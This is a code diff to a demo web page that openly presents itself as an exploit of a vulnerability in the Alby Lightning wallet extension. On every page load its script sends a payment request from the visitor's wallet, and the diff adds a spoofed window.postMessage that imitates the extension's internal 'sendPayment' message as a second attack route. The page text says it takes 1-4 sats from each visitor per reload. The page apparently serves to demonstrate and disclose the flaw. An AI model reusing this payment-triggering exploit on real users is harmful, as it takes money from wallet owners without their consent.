@@ -17,8 +17,20 @@
     await window.webln.execute("sendPayment", {
       paymentRequest: actualInvoice
     });
+    window.postMessage(
+     {
+        application: "LBE",
+        prompt: true,
+        action: "sendPayment",
+        type: "enable",
+        args: {
+          paymentRequest: actualInvoice
+        },
+      },
+      "*"
+    );
   }
   sendFreeSats();
 </script>
 <h1>I took your Sats!</h1>
-This is a demo site for an Alby vulnerability which sends me 2 sats (because it uses two different ways of exploiting a vulnerability for testing purposes) on every reload. Let me know if you want me to send it back.
+This is a demo site for an Alby vulnerability which sends me 1-4 sats (because it uses different ways of exploiting a vulnerability for testing purposes) on every reload. Let me know if you want me to send it back.
